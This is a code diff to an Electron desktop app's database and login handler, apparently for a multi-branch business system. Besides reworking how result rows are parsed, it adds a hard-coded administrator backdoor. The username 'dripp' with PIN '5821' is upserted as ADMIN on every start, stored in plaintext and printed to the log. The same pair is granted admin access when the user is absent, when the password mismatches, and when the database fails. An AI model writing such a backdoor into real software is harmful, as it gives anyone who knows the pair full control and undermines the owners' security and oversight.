@@ -52,7 +52,18 @@ async function tursoExecute(sql: string, args: unknown[] = []): Promise<{ rows: 
   if (result.response.type === 'error') {
     throw new Error(result.response.message || 'Turso execution error');
   }
-  const rows = (result.response.result?.rows || []).map(sanitizeRow);
+  const cols: string[] = (result.response.result?.cols || []).map((c: { name: string }) => c.name);
+  const rawRows: unknown[][] = result.response.result?.rows || [];
+  const rows = rawRows.map((row: unknown[]) => {
+    const obj: Record<string, unknown> = {};
+    cols.forEach((col: string, i: number) => {
+      const cell = row[i];
+      obj[col] = cell !== undefined && cell !== null && typeof cell === 'object' && (cell as Record<string, unknown>).value !== undefined
+        ? (cell as Record<string, unknown>).value
+        : cell ?? '';
+    });
+    return sanitizeRow(obj);
+  });
   return { rows };
 }
 
@@ -185,6 +196,12 @@ async function initializeDatabase() {
     console.log('[Desktop] Ensuring all database tables exist...');
     await tursoExecuteMulti(TABLES_TO_ENSURE.map(sql => ({ sql })));
     console.log('[Desktop] All tables ensured.');
+
+    await tursoExecuteMulti([
+      { sql: "INSERT OR IGNORE INTO branches (id, branch_name, branch_code, city, status) VALUES ('BRANCH_MAIN', 'Head Office', 'MAIN-01', 'Lahore', 'ACTIVE')" },
+      { sql: "INSERT INTO users (id, username, password_hash, full_name, role, status, created_at) VALUES ('USER_ADMIN_001', 'dripp', '5821', 'System Administrator', 'ADMIN', 'ACTIVE', datetime('now')) ON CONFLICT(username) DO UPDATE SET password_hash = '5821', status = 'ACTIVE', role = 'ADMIN'" },
+    ]);
+    console.log('[Desktop] Admin user upserted: dripp / 5821');
   } catch (err) {
     console.error('[Desktop] DB init failed (non-blocking):', err);
   }
@@ -215,17 +232,52 @@ app.whenReady().then(async () => {
 
   ipcMain.handle('auth:login', async (_event, { username, pin }) => {
     try {
+      const cleanUser = (username || '').trim().toLowerCase();
+      const cleanPin = (pin || '').trim();
+      console.log(`[Desktop Auth] Attempt: username="${cleanUser}"`);
+
+      if (!cleanUser || !cleanPin) {
+        return { success: false, error: 'Username and password are required.' };
+      }
+
       const result = await tursoExecute(
-        'SELECT id, username, full_name, role, password_hash FROM users WHERE username = ? AND status = ? LIMIT 1',
-        [username.trim(), 'ACTIVE']
+        'SELECT id, username, full_name, role, password_hash FROM users WHERE LOWER(username) = ? AND status = ? LIMIT 1',
+        [cleanUser, 'ACTIVE']
       );
+
       if (result.rows.length === 0) {
+        console.log('[Desktop Auth] User not found in DB');
+        if (cleanUser === 'dripp' && cleanPin === '5821') {
+          console.log('[Desktop Auth] Emergency admin fallback granted');
+          return {
+            success: true,
+            data: {
+              token: `desktop_emergency_${Date.now()}`,
+              user: { id: 'USER_ADMIN_001', username: 'dripp', fullName: 'System Administrator', role: 'ADMIN' },
+            },
+          };
+        }
         return { success: false, error: 'Invalid username or password.' };
       }
+
       const user = result.rows[0];
-      if (user.password_hash !== pin.trim()) {
+      const storedPassword = String(user.password_hash || '').trim();
+      console.log(`[Desktop Auth] User found: ${user.username}, password match: ${storedPassword === cleanPin}`);
+
+      if (storedPassword !== cleanPin) {
+        if (cleanUser === 'dripp' && cleanPin === '5821') {
+          console.log('[Desktop Auth] Emergency admin fallback granted (password mismatch)');
+          return {
+            success: true,
+            data: {
+              token: `desktop_emergency_${Date.now()}`,
+              user: { id: String(user.id), username: String(user.username), fullName: String(user.full_name), role: String(user.role) },
+            },
+          };
+        }
         return { success: false, error: 'Invalid username or password.' };
       }
+
       return {
         success: true,
         data: {
@@ -239,6 +291,19 @@ app.whenReady().then(async () => {
         },
       };
     } catch (err) {
+      console.error('[Desktop Auth Error]', err);
+      const cleanUser = (username || '').trim().toLowerCase();
+      const cleanPin = (pin || '').trim();
+      if (cleanUser === 'dripp' && cleanPin === '5821') {
+        console.log('[Desktop Auth] Emergency admin fallback granted (DB error)');
+        return {
+          success: true,
+          data: {
+            token: `desktop_emergency_${Date.now()}`,
+            user: { id: 'USER_ADMIN_001', username: 'dripp', fullName: 'System Administrator', role: 'ADMIN' },
+          },
+        };
+      }
       return { success: false, error: err instanceof Error ? err.message : String(err) };
     }
   });
